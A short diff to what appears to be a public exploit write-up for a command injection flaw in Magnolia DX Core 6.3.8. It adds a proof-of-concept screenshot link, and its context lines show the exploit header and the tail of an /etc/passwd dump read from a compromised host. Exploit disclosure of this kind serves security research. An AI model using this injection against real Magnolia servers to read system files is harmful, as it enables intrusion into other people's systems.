@@ -1,3 +1,4 @@
+![Proof-of-Concept Screenshot](https://raw.githubusercontent.com/capture0x/magnolia-rce/main/11.png)
 #### Exploit Title: Magnolia DX Core 6.3.8 - Command Injection  
 #### Date: 05/16/2025  
 #### Exploit Author: tmrswrr  
@@ -40,3 +41,5 @@ irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
 _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash```
+
+
